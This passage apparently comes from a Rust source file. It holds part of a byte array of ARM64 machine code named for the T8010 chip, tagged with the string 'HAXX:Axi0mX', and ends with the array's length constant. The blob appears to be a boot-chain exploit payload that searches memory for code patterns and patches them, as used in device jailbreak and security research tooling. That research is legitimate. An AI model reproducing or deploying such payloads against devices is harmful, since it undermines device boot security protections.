        0x48, 0x41, 0x58, 0x58, 0x3a, 0x41, 0x78, 0x69, 0x30, 0x6d, 0x58, 0x20,
        0x45, 0x54, 0x41, 0x3a, 0x73, 0x6f, 0x6e, 0x00, 0x00, 0xc0, 0x01, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x90, 0x0a, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x80,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1b, 0x80, 0x01, 0x00, 0x00, 0x00,
        0xd8, 0x7b, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x68, 0xf7, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x58, 0xb1, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0xf4, 0xa6, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x30, 0x19, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x68, 0x11, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x50, 0xb8, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x84, 0xde, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x7c, 0x78, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x40, 0x3d, 0x08, 0x80, 0x01, 0x00, 0x00, 0x00, 0x77, 0x3d, 0x08, 0x80,
        0x01, 0x00, 0x00, 0x00, 0xf4, 0x3c, 0x08, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x04, 0x00, 0x40, 0xb9, 0x84, 0x00, 0x02, 0x0a, 0x9f, 0x00, 0x01, 0x6b,
        0xa0, 0x00, 0x00, 0x54, 0x00, 0x10, 0x00, 0x91, 0x63, 0x10, 0x00, 0x51,
        0x43, 0xff, 0xff, 0x35, 0xe0, 0x03, 0x1f, 0xaa, 0xc0, 0x03, 0x5f, 0xd6,
        0x04, 0x00, 0x40, 0xb9, 0x84, 0x00, 0x02, 0x0a, 0x9f, 0x00, 0x01, 0x6b,
        0xa0, 0x00, 0x00, 0x54, 0x00, 0x10, 0x00, 0xd1, 0x63, 0x10, 0x00, 0x51,
        0x43, 0xff, 0xff, 0x35, 0xe0, 0x03, 0x1f, 0xaa, 0xc0, 0x03, 0x5f, 0xd6,
        0xe2, 0x03, 0x00, 0xaa, 0xa5, 0x4e, 0xb2, 0x52, 0x05, 0x00, 0x9a, 0x72,
        0x06, 0x48, 0xb6, 0x52, 0xe7, 0x43, 0xb5, 0x52, 0x28, 0x40, 0xa5, 0x52,
        0x08, 0x7c, 0x80, 0x72, 0x43, 0x44, 0x40, 0xb8, 0x64, 0x68, 0x1b, 0x12,
        0x9f, 0x00, 0x05, 0x6b, 0xa1, 0xff, 0xff, 0x54, 0x66, 0x10, 0x1b, 0x33,
        0x44, 0x00, 0x40, 0xb9, 0x83, 0x68, 0x1b, 0x12, 0x7f, 0x00, 0x06, 0x6b,
        0x60, 0x01, 0x00, 0x54, 0x7f, 0x00, 0x08, 0x6b, 0xc1, 0xfe, 0xff, 0x54,
        0xc9, 0x10, 0x1b, 0x12, 0x09, 0x40, 0xb5, 0x72, 0x89, 0x10, 0x10, 0x33,
        0x44, 0x04, 0x40, 0xb9, 0x83, 0x68, 0x1b, 0x12, 0x7f, 0x00, 0x09, 0x6b,
        0xe1, 0xfd, 0xff, 0x54, 0x42, 0x10, 0x00, 0x91, 0x87, 0x24, 0x00, 0x33,
        0x47, 0x00, 0x00, 0xb9, 0xc0, 0x03, 0x5f, 0xd6, 0xe2, 0x03, 0x00, 0xaa,
        0xc7, 0x41, 0xa6, 0x52, 0x07, 0x7c, 0x80, 0x72, 0x08, 0x54, 0xaa, 0x52,
        0x08, 0x10, 0x80, 0x72, 0x09, 0x40, 0xb5, 0x52, 0x09, 0x7e, 0x80, 0x72,
        0xea, 0x40, 0x40, 0x51, 0x0b, 0x01, 0x02, 0x11, 0x43, 0x44, 0x40, 0xb8,
        0x7f, 0x00, 0x07, 0x6b, 0x64, 0x10, 0x48, 0x7a, 0xa1, 0xff, 0xff, 0x54,
        0x43, 0x90, 0x40, 0x29, 0x63, 0x6c, 0x1c, 0x12, 0x9f, 0x00, 0x0a, 0x6b,
        0x84, 0x10, 0x4b, 0x7a, 0x60, 0x00, 0x49, 0x7a, 0xe1, 0xfe, 0xff, 0x54,
        0x43, 0x00, 0x40, 0xb9, 0x44, 0x0c, 0x40, 0xb9, 0x63, 0x00, 0x04, 0x4b,
        0x84, 0x7c, 0x1a, 0x53, 0x9f, 0x94, 0x00, 0x71, 0x60, 0x08, 0x43, 0x7a,
        0x01, 0xfe, 0xff, 0x54, 0x42, 0x30, 0x00, 0x91, 0x43, 0x4c, 0x40, 0xb8,
        0x64, 0x7c, 0x1a, 0x53, 0x9f, 0x94, 0x00, 0x71, 0xa1, 0xff, 0xff, 0x54,
        0x63, 0x64, 0x00, 0x13, 0x47, 0x00, 0x00, 0x18, 0x47, 0xd8, 0x23, 0xb8,
        0xc0, 0x03, 0x5f, 0xd6, 0xe2, 0x03, 0x00, 0xaa, 0x08, 0x40, 0xa6, 0x52,
        0x08, 0xfc, 0x80, 0x72, 0x09, 0x50, 0xaa, 0x52, 0x09, 0x0c, 0x80, 0x72,
        0xaa, 0x04, 0x80, 0x52, 0x43, 0x44, 0x40, 0xb8, 0x7f, 0x00, 0x08, 0x6b,
        0x64, 0x10, 0x49, 0x7a, 0xa1, 0xff, 0xff, 0x54, 0x43, 0x10, 0x40, 0x29,
        0x45, 0x18, 0x41, 0x29, 0x47, 0x10, 0x40, 0xb9, 0x63, 0x7c, 0x1a, 0x53,
        0xa5, 0x7c, 0x1a, 0x53, 0x9f, 0x00, 0x08, 0x6b, 0x84, 0x10, 0x49, 0x7a,
        0xa1, 0xfe, 0xff, 0x54, 0xdf, 0x00, 0x08, 0x6b, 0xc4, 0x10, 0x49, 0x7a,
        0xe4, 0x7c, 0x1a, 0x53, 0x60, 0x00, 0x4a, 0x7a, 0xa0, 0x00, 0x4a, 0x7a,
        0x80, 0x00, 0x4a, 0x7a, 0xc1, 0xfd, 0xff, 0x54, 0x42, 0x40, 0x00, 0x91,
        0xe7, 0x64, 0x00, 0x13, 0x43, 0x00, 0x00, 0x18, 0x43, 0xd8, 0x27, 0xb8,
        0xc0, 0x03, 0x5f, 0xd6, 0xe2, 0x03, 0x00, 0xaa, 0x03, 0x28, 0xb7, 0x52,
        0x23, 0x21, 0x80, 0x72, 0x24, 0x40, 0xa6, 0x52, 0x24, 0x25, 0x80, 0x72,
        0x05, 0x20, 0xb7, 0x52, 0x25, 0x21, 0x80, 0x72, 0x66, 0xa0, 0xba, 0x52,
        0xe6, 0xf3, 0x87, 0x72, 0xe7, 0xcb, 0xba, 0x52, 0x07, 0x78, 0x80, 0x72,
        0x08, 0x50, 0xbe, 0x52, 0x08, 0x01, 0x80, 0x72, 0x09, 0x80, 0xa6, 0x52,
        0x4a, 0xac, 0xc0, 0x29, 0x5f, 0x01, 0x03, 0x6b, 0x60, 0x01, 0x44, 0x7a,
        0xa1, 0xff, 0xff, 0x54, 0x4a, 0x2c, 0x41, 0x29, 0x7f, 0x01, 0x06, 0x6b,
        0x64, 0x11, 0x47, 0x7a, 0x40, 0x01, 0x45, 0x7a, 0x01, 0xff, 0xff, 0x54,
        0x4a, 0xc0, 0x5f, 0xb8, 0x4a, 0x35, 0x09, 0x12, 0x5f, 0x01, 0x08, 0x6b,
        0x81, 0xfe, 0xff, 0x54, 0x4a, 0x10, 0x00, 0xd1, 0x4b, 0x61, 0x00, 0xd1,
        0x4c, 0xcd, 0x5f, 0xb8, 0x8d, 0x35, 0x09, 0x12, 0xbf, 0x01, 0x09, 0x6b,
        0x80, 0x00, 0x00, 0x54, 0x5f, 0x01, 0x0b, 0xeb, 0x68, 0xff, 0xff, 0x54,
        0xeb, 0xff, 0xff, 0x17, 0x8c, 0x5d, 0x05, 0x13, 0x08, 0x80, 0xa2, 0x52,
        0x88, 0x65, 0x00, 0x33, 0x48, 0x01, 0x00, 0xb9, 0xc0, 0x03, 0x5f, 0xd6
];

const YOLO_T8010_BIN_LEN: usize = 4836;